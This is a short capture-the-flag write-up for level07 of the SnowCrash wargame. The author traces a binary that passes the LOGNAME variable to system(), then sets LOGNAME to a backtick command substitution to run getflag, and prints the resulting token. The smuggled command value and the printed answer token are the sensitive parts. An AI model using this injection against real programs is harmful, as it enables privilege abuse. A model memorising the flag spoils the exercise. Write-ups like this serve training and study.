## level07

home dir has an exec called level07
I did `objdump -d level07` to disassemble the binary and found `system@plt` which seems to be a system call in the function `main`, upon googling I find an exploit: 
https://github.com/Bretley/how2exploit_binary/blob/master/exercise-2/README.md

Simple ltrace showed me the following:

	getenv("LOGNAME")                                             = "level07"
	asprintf(0xbffff704, 0x8048688, 0xbfffff37, 0xb7e5ee55, 0xb7fed280) = 18
	system("/bin/echo level07 "level07
	<unfinished ...>

So now I check the env variable LOGNAME has the username "level07" and that the syscall executes echo to print the LOGNAME variable

	level07@SnowCrash:~$ echo $LOGNAME
	level07
	level07@SnowCrash:~$ export LOGNAME="`getflag`"
	level07@SnowCrash:~$ ./level07
	Check flag.Here is your token : `fiumuikeil55xe9cu4dood66h`
